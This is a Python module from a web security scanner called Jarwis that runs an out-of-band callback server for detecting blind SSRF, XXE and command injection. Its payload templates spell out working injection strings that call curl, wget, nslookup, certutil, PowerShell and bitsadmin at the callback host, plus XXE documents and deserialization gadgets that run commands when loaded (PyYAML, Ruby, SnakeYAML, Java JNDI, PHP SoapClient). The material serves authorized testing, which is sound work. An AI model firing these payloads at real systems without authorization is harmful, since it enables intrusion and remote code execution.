"""
JARWIS OOB (Out-of-Band) Callback Server for Blind Vulnerability Detection

Like Burp Collaborator, but built into Jarwis. Used for detecting:
- Blind SSRF (Server-Side Request Forgery)
- Blind XXE (XML External Entity Injection)  
- SSRF via PDF/Image generation
- DNS rebinding attacks
- Any vulnerability that causes external HTTP/DNS requests

How it works:
1. Generate unique callback ID for each payload
2. Inject callback URL (http://callback-server:port/ID) into target
3. If target is vulnerable, it makes request to our callback server
4. Callback server logs the request and flags the vulnerability

Usage:
    server = OOBCallbackServer(port=9999)
    await server.start()
    
    # Generate unique callback for SSRF payload
    callback_id, callback_url = server.generate_callback(
        scan_id="abc123",
        attack_type="ssrf",
        payload_context="http://internal-server"
    )
    
    # Use callback_url in your attack payload
    payload = f"http://example.com?url={callback_url}"
    
    # After sending payload, check if callback was received
    await asyncio.sleep(5)  # Wait for potential callback
    
    if server.check_callback(callback_id):
        print("VULNERABLE! Target made external request")
        details = server.get_callback_details(callback_id)
"""

import asyncio
import logging
import json
import uuid
import hashlib
import threading
import socket
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field, asdict
from aiohttp import web
import aiohttp

logger = logging.getLogger(__name__)


@dataclass
class CallbackRecord:
    """Record of a received callback"""
    callback_id: str
    scan_id: str
    attack_type: str
    payload_context: str
    created_at: str
    received_at: Optional[str] = None
    received: bool = False
    
    # Request details when callback is received
    source_ip: Optional[str] = None
    method: Optional[str] = None
    path: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    query_params: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    user_agent: Optional[str] = None
    
    # DNS callback (if DNS server enabled)
    dns_query: Optional[str] = None
    dns_type: Optional[str] = None


@dataclass
class CallbackServerConfig:
    """Configuration for OOB callback server"""
    http_port: int = 9999
    dns_port: int = 5353  # Non-privileged DNS port
    enable_dns: bool = False
    external_url: Optional[str] = None  # e.g., ngrok URL for external accessibility
    callback_ttl_hours: int = 24  # How long to keep callback records
    log_dir: Optional[str] = None
    webhook_url: Optional[str] = None  # Notify on callback received


class OOBCallbackServer:
    """
    Out-of-Band callback server for blind vulnerability detection.
    
    Inspired by Burp Collaborator but integrated into Jarwis.
    """
    
    def __init__(
        self,
        port: int = 9999,
        host: str = "0.0.0.0",
        external_url: Optional[str] = None,
        scan_id: Optional[str] = None,
        enable_dns: bool = False,
        webhook_callback: Optional[Callable] = None
    ):
        self.port = port
        self.host = host
        self.scan_id = scan_id
        self.enable_dns = enable_dns
        self.webhook_callback = webhook_callback
        
        # External URL for payloads (if behind NAT/ngrok)
        # If not set, will use local IP
        self._external_url = external_url
        
        # Callback storage
        self._callbacks: Dict[str, CallbackRecord] = {}
        self._callbacks_by_scan: Dict[str, List[str]] = {}
        
        # Server state
        self._app: Optional[web.Application] = None
        self._runner: Optional[web.AppRunner] = None
        self._site: Optional[web.TCPSite] = None
        self._running = False
        
        # Log directory
        self._log_dir = Path.home() / ".jarwis" / "oob_callbacks"
        self._log_dir.mkdir(parents=True, exist_ok=True)
        
        # Local IP cache
        self._local_ip: Optional[str] = None
    
    @property
    def base_url(self) -> str:
        """Get the base URL for callback URLs"""
        if self._external_url:
            return self._external_url.rstrip('/')
        
        if not self._local_ip:
            self._local_ip = self._get_local_ip()
        
        return f"http://{self._local_ip}:{self.port}"
    
    def _get_local_ip(self) -> str:
        """Get the local IP address for callback URLs"""
        try:
            # Create a socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"
    
    def generate_callback(
        self,
        scan_id: str,
        attack_type: str,
        payload_context: str = "",
        custom_path: Optional[str] = None
    ) -> Tuple[str, str]:
        """
        Generate a unique callback URL for a payload.
        
        Args:
            scan_id: ID of the current scan
            attack_type: Type of attack (ssrf, xxe, etc.)
            payload_context: Context about the payload (for logging)
            custom_path: Optional custom path suffix
            
        Returns:
            Tuple of (callback_id, callback_url)
        """
        # Generate unique callback ID
        unique_data = f"{scan_id}:{attack_type}:{datetime.now().isoformat()}:{uuid.uuid4()}"
        callback_id = hashlib.sha256(unique_data.encode()).hexdigest()[:16]
        
        # Create callback record
        record = CallbackRecord(
            callback_id=callback_id,
            scan_id=scan_id,
            attack_type=attack_type,
            payload_context=payload_context,
            created_at=datetime.now().isoformat()
        )
        
        # Store callback
        self._callbacks[callback_id] = record
        
        # Index by scan
        if scan_id not in self._callbacks_by_scan:
            self._callbacks_by_scan[scan_id] = []
        self._callbacks_by_scan[scan_id].append(callback_id)
        
        # Generate URL
        path = custom_path or callback_id
        callback_url = f"{self.base_url}/c/{path}"
        
        logger.debug(f"Generated callback: {callback_id} -> {callback_url}")
        
        return callback_id, callback_url
    
    def generate_dns_callback(
        self,
        scan_id: str,
        attack_type: str,
        payload_context: str = ""
    ) -> Tuple[str, str]:
        """
        Generate a DNS callback subdomain.
        
        Returns:
            Tuple of (callback_id, dns_hostname)
        """
        callback_id, _ = self.generate_callback(scan_id, attack_type, payload_context)
        
        # For DNS callbacks, the callback_id becomes a subdomain
        # Format: {callback_id}.callback.jarwis.local
        if self._external_url:
            # Extract domain from external URL
            from urllib.parse import urlparse
            parsed = urlparse(self._external_url)
            dns_hostname = f"{callback_id}.{parsed.netloc}"
        else:
            dns_hostname = f"{callback_id}.callback.local"
        
        return callback_id, dns_hostname
    
    def check_callback(self, callback_id: str) -> bool:
        """Check if a callback was received"""
        record = self._callbacks.get(callback_id)
        return record.received if record else False
    
    def get_callback_details(self, callback_id: str) -> Optional[Dict[str, Any]]:
        """Get details of a received callback"""
        record = self._callbacks.get(callback_id)
        if record:
            return asdict(record)
        return None
    
    def get_callbacks_for_scan(self, scan_id: str) -> List[Dict[str, Any]]:
        """Get all callbacks for a scan"""
        callback_ids = self._callbacks_by_scan.get(scan_id, [])
        return [asdict(self._callbacks[cid]) for cid in callback_ids if cid in self._callbacks]
    
    def get_received_callbacks(self, scan_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """Get all received callbacks, optionally filtered by scan"""
        results = []
        for callback_id, record in self._callbacks.items():
            if record.received:
                if scan_id is None or record.scan_id == scan_id:
                    results.append(asdict(record))
        return results
    
    async def _handle_callback(self, request: web.Request) -> web.Response:
        """Handle incoming callback request"""
        # Extract callback ID from path
        path = request.match_info.get('path', '')
        callback_id = path.split('/')[0] if path else None
        
        # Get source IP
        source_ip = request.remote
        if 'X-Forwarded-For' in request.headers:
            source_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
        
        # Read body
        try:
            body = await request.text()
        except Exception:
            body = None
        
        # Log the callback
        timestamp = datetime.now().isoformat()
        logger.info(f"OOB Callback received: {callback_id} from {source_ip}")
        
        # Update callback record if it exists
        if callback_id and callback_id in self._callbacks:
            record = self._callbacks[callback_id]
            record.received = True
            record.received_at = timestamp
            record.source_ip = source_ip
            record.method = request.method
            record.path = request.path
            record.headers = dict(request.headers)
            record.query_params = dict(request.query)
            record.body = body
            record.user_agent = request.headers.get('User-Agent', '')
            
            # Invoke webhook callback if set
            if self.webhook_callback:
                try:
                    await self.webhook_callback(record)
                except Exception as e:
                    logger.warning(f"Webhook callback failed: {e}")
            
            # Log to file
            self._log_callback(record)
            
            logger.info(
                f"CALLBACK CONFIRMED: {callback_id} | "
                f"Type: {record.attack_type} | "
                f"Scan: {record.scan_id} | "
                f"From: {source_ip}"
            )
        else:
            # Unknown callback - still log it
            logger.warning(f"Unknown callback received: {path} from {source_ip}")
            self._log_unknown_callback(path, source_ip, request.method, dict(request.headers), body)
        
        # Return a minimal response (avoid revealing we're a callback server)
        return web.Response(text="OK", content_type="text/plain")
    
    async def _handle_health(self, request: web.Request) -> web.Response:
        """Health check endpoint"""
        return web.json_response({
            "status": "running",
            "port": self.port,
            "callbacks_registered": len(self._callbacks),
            "callbacks_received": len([c for c in self._callbacks.values() if c.received])
        })
    
    async def _handle_stats(self, request: web.Request) -> web.Response:
        """Stats endpoint for the callback server"""
        stats = {
            "total_registered": len(self._callbacks),
            "total_received": len([c for c in self._callbacks.values() if c.received]),
            "by_attack_type": {},
            "by_scan": {}
        }
        
        for record in self._callbacks.values():
            # By attack type
            if record.attack_type not in stats["by_attack_type"]:
                stats["by_attack_type"][record.attack_type] = {"registered": 0, "received": 0}
            stats["by_attack_type"][record.attack_type]["registered"] += 1
            if record.received:
                stats["by_attack_type"][record.attack_type]["received"] += 1
            
            # By scan
            if record.scan_id not in stats["by_scan"]:
                stats["by_scan"][record.scan_id] = {"registered": 0, "received": 0}
            stats["by_scan"][record.scan_id]["registered"] += 1
            if record.received:
                stats["by_scan"][record.scan_id]["received"] += 1
        
        return web.json_response(stats)
    
    def _log_callback(self, record: CallbackRecord):
        """Log callback to file"""
        log_file = self._log_dir / f"callbacks_{record.scan_id}.json"
        
        # Load existing or create new
        if log_file.exists():
            with open(log_file, 'r') as f:
                data = json.load(f)
        else:
            data = {"callbacks": []}
        
        data["callbacks"].append(asdict(record))
        
        with open(log_file, 'w') as f:
            json.dump(data, f, indent=2)
    
    def _log_unknown_callback(self, path: str, source_ip: str, method: str, headers: dict, body: str):
        """Log unknown callback to file"""
        log_file = self._log_dir / "unknown_callbacks.json"
        
        if log_file.exists():
            with open(log_file, 'r') as f:
                data = json.load(f)
        else:
            data = {"callbacks": []}
        
        data["callbacks"].append({
            "timestamp": datetime.now().isoformat(),
            "path": path,
            "source_ip": source_ip,
            "method": method,
            "headers": headers,
            "body": body
        })
        
        with open(log_file, 'w') as f:
            json.dump(data, f, indent=2)
    
    async def start(self) -> bool:
        """Start the callback server"""
        if self._running:
            logger.warning("OOB Callback server already running")
            return True
        
        try:
            self._app = web.Application()
            
            # Add routes
            self._app.router.add_route('*', '/c/{path:.*}', self._handle_callback)
            self._app.router.add_get('/health', self._handle_health)
            self._app.router.add_get('/stats', self._handle_stats)
            
            # Catch-all for any other paths (some payloads might hit root)
            self._app.router.add_route('*', '/{path:.*}', self._handle_callback)
            
            self._runner = web.AppRunner(self._app)
            await self._runner.setup()
            
            self._site = web.TCPSite(self._runner, self.host, self.port)
            await self._site.start()
            
            self._running = True
            logger.info(f"OOB Callback server started on {self.host}:{self.port}")
            logger.info(f"Callback base URL: {self.base_url}")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start OOB callback server: {e}")
            return False
    
    async def stop(self):
        """Stop the callback server"""
        if self._runner:
            await self._runner.cleanup()
        self._running = False
        logger.info("OOB Callback server stopped")
    
    def cleanup_old_callbacks(self, max_age_hours: int = 24):
        """Remove old callback records"""
        cutoff = datetime.now() - timedelta(hours=max_age_hours)
        
        to_remove = []
        for callback_id, record in self._callbacks.items():
            created = datetime.fromisoformat(record.created_at)
            if created < cutoff and not record.received:
                to_remove.append(callback_id)
        
        for callback_id in to_remove:
            record = self._callbacks.pop(callback_id)
            if record.scan_id in self._callbacks_by_scan:
                self._callbacks_by_scan[record.scan_id].remove(callback_id)
        
        if to_remove:
            logger.info(f"Cleaned up {len(to_remove)} old callback records")


# Global singleton instance
_callback_server: Optional[OOBCallbackServer] = None
_server_lock = threading.Lock()


def get_callback_server(
    port: int = 9999,
    external_url: Optional[str] = None,
    auto_start: bool = True
) -> OOBCallbackServer:
    """Get or create the global callback server instance"""
    global _callback_server
    
    with _server_lock:
        if _callback_server is None:
            _callback_server = OOBCallbackServer(port=port, external_url=external_url)
        
        return _callback_server


async def ensure_callback_server_running(
    port: int = 9999,
    external_url: Optional[str] = None
) -> OOBCallbackServer:
    """Ensure the callback server is running and return it"""
    server = get_callback_server(port, external_url)
    
    if not server._running:
        await server.start()
    
    return server


# Payload templates for different attack types
class OOBPayloadTemplates:
    """Pre-built payload templates using callback URLs"""
    
    @staticmethod
    def ssrf_url(callback_url: str) -> List[str]:
        """Generate SSRF payloads with callback URL"""
        return [
            callback_url,
            f"http://127.0.0.1@{callback_url.replace('http://', '')}",
            f"http://localhost@{callback_url.replace('http://', '')}",
            callback_url.replace("http://", "http://127.0.0.1#"),
            callback_url.replace("http://", "//"),
        ]
    
    @staticmethod
    def xxe_external_dtd(callback_url: str) -> str:
        """Generate XXE payload with external DTD callback"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<data>&xxe;</data>'''
    
    @staticmethod
    def xxe_parameter_entity(callback_url: str) -> str:
        """Generate XXE payload with parameter entity callback"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback_url}">
  %xxe;
]>
<data>test</data>'''
    
    @staticmethod
    def ssrf_redirect(callback_url: str) -> str:
        """SSRF via redirect"""
        return f"http://httpbin.org/redirect-to?url={callback_url}"
    
    @staticmethod
    def pdf_ssrf(callback_url: str) -> str:
        """SSRF via PDF generation (common in HTML-to-PDF)"""
        return f'''<html>
<head>
<link rel="stylesheet" href="{callback_url}/style.css">
</head>
<body>
<img src="{callback_url}/image.png">
<iframe src="{callback_url}/frame.html"></iframe>
</body>
</html>'''
    
    # =========================================================================
    # OS Command Injection OOB Payloads
    # =========================================================================
    
    @staticmethod
    def cmdi_curl(callback_url: str, token: str = "") -> List[str]:
        """Generate OS command injection payloads using curl"""
        url = f"{callback_url}/{token}" if token else callback_url
        return [
            f"; curl {url}",
            f"| curl {url}",
            f"|| curl {url}",
            f"&& curl {url}",
            f"& curl {url}",
            f"$(curl {url})",
            f"`curl {url}`",
            f"'; curl {url}; '",
            f'"; curl {url}; "',
            f"%0acurl {url}",
            f"; curl -s {url}",
            f"; curl --silent {url}",
        ]
    
    @staticmethod
    def cmdi_wget(callback_url: str, token: str = "") -> List[str]:
        """Generate OS command injection payloads using wget"""
        url = f"{callback_url}/{token}" if token else callback_url
        return [
            f"; wget {url}",
            f"| wget {url}",
            f"|| wget -q {url}",
            f"&& wget --quiet {url}",
            f"$(wget -q -O- {url})",
            f"`wget -q {url}`",
            f"'; wget {url}; '",
        ]
    
    @staticmethod
    def cmdi_nslookup(callback_host: str, token: str = "") -> List[str]:
        """Generate OS command injection payloads using nslookup (DNS exfil)"""
        hostname = f"{token}.{callback_host}" if token else callback_host
        return [
            f"; nslookup {hostname}",
            f"| nslookup {hostname}",
            f"|| nslookup {hostname}",
            f"&& nslookup {hostname}",
            f"$(nslookup {hostname})",
            f"`nslookup {hostname}`",
            f"; dig {hostname}",
            f"| host {hostname}",
            f"'; nslookup {hostname}; '",
            # Windows
            f"& nslookup {hostname}",
            f"| nslookup {hostname}",
        ]
    
    @staticmethod
    def cmdi_ping(callback_host: str, token: str = "") -> List[str]:
        """Generate OS command injection payloads using ping (useful for firewalled envs)"""
        hostname = f"{token}.{callback_host}" if token else callback_host
        return [
            f"; ping -c1 {hostname}",
            f"| ping -c1 {hostname}",
            f"&& ping -c1 {hostname}",
            f"$(ping -c1 {hostname})",
            # Windows
            f"& ping -n 1 {hostname}",
        ]
    
    @staticmethod
    def cmdi_certutil_windows(callback_url: str, token: str = "") -> List[str]:
        """Generate Windows-specific command injection payloads"""
        url = f"{callback_url}/{token}" if token else callback_url
        return [
            f"& certutil -urlcache -f {url} NUL",
            f"| certutil -urlcache -f {url} NUL",
            f"& powershell Invoke-WebRequest {url}",
            f"| powershell (New-Object Net.WebClient).DownloadString('{url}')",
            f"& bitsadmin /transfer j {url} %temp%\\t",
        ]
    
    @staticmethod
    def cmdi_all(callback_url: str, callback_host: str, token: str = "") -> List[str]:
        """Generate all OS command injection OOB payloads"""
        payloads = []
        payloads.extend(OOBPayloadTemplates.cmdi_curl(callback_url, token))
        payloads.extend(OOBPayloadTemplates.cmdi_wget(callback_url, token))
        payloads.extend(OOBPayloadTemplates.cmdi_nslookup(callback_host, token))
        payloads.extend(OOBPayloadTemplates.cmdi_certutil_windows(callback_url, token))
        return payloads
    
    # =========================================================================
    # Insecure Deserialization OOB Payloads
    # =========================================================================
    
    @staticmethod
    def deser_php_soap_client(callback_url: str) -> str:
        """Generate PHP SoapClient SSRF gadget for deserialization"""
        # This payload exploits the PHP SoapClient __call magic method
        # When deserialized, it will make an HTTP request to the callback URL
        return f'O:10:"SoapClient":3:{{s:3:"uri";s:1:"a";s:8:"location";s:{len(callback_url)}:"{callback_url}";s:13:"_soap_version";i:1;}}'
    
    @staticmethod
    def deser_java_jndi(callback_host: str, token: str = "") -> List[str]:
        """Generate Java JNDI/RMI/LDAP lookup URLs for deserialization"""
        hostname = f"{token}.{callback_host}" if token else callback_host
        return [
            f"rmi://{hostname}/exploit",
            f"ldap://{hostname}/exploit",
            f"iiop://{hostname}/exploit",
            f"dns://{hostname}",
        ]
    
    @staticmethod
    def deser_python_pickle(callback_url: str) -> str:
        """
        Generate Python pickle payload that calls urllib.
        NOTE: This is a detection payload - actual exploitation may require ysoserial-net or custom gadgets.
        """
        import base64
        # This is a simplified template - actual pickle RCE would need custom class
        code = f'''
import pickle
import urllib.request
class RCE:
    def __reduce__(self):
        return (urllib.request.urlopen, ("{callback_url}",))
print(pickle.dumps(RCE()))
'''
        return f"# Python pickle RCE - generate with: {code}"
    
    @staticmethod
    def deser_yaml_python(callback_url: str) -> List[str]:
        """Generate YAML deserialization payloads for Python (PyYAML)"""
        return [
            f"!!python/object/apply:urllib.request.urlopen ['{callback_url}']",
            f"!!python/object/apply:subprocess.check_output [['curl', '{callback_url}']]",
            f"!!python/object/apply:os.system ['curl {callback_url}']",
        ]
    
    @staticmethod
    def deser_yaml_ruby(callback_url: str) -> str:
        """Generate YAML deserialization payload for Ruby"""
        return f'''--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher  
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: "curl {callback_url}"
       method_id: :resolve
'''
    
    @staticmethod
    def deser_snakeyaml_java(callback_url: str) -> str:
        """Generate SnakeYAML deserialization payload for Java"""
        return f'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["{callback_url}"]]]]'


# Integration helper for scanners
class OOBIntegration:
    """Helper class for integrating OOB callbacks into scanners"""
    
    def __init__(self, scan_id: str, attack_type: str):
        self.scan_id = scan_id
        self.attack_type = attack_type
        self._server: Optional[OOBCallbackServer] = None
        self._callbacks: List[str] = []
    
    async def setup(self, port: int = 9999) -> bool:
        """Setup the callback server"""
        self._server = await ensure_callback_server_running(port)
        return self._server._running
    
    def generate_callback(self, context: str = "") -> Tuple[str, str]:
        """Generate a callback URL"""
        if not self._server:
            raise RuntimeError("OOB server not initialized. Call setup() first.")
        
        callback_id, callback_url = self._server.generate_callback(
            scan_id=self.scan_id,
            attack_type=self.attack_type,
            payload_context=context
        )
        self._callbacks.append(callback_id)
        return callback_id, callback_url
    
    async def wait_and_check(self, timeout: float = 10.0) -> List[Dict[str, Any]]:
        """Wait for callbacks and return any that were received"""
        await asyncio.sleep(timeout)
        
        received = []
        for callback_id in self._callbacks:
            if self._server.check_callback(callback_id):
                details = self._server.get_callback_details(callback_id)
                if details:
                    received.append(details)
        
        return received
    
    def check_all(self) -> List[Dict[str, Any]]:
        """Check all callbacks without waiting"""
        received = []
        for callback_id in self._callbacks:
            if self._server.check_callback(callback_id):
                details = self._server.get_callback_details(callback_id)
                if details:
                    received.append(details)
        return received
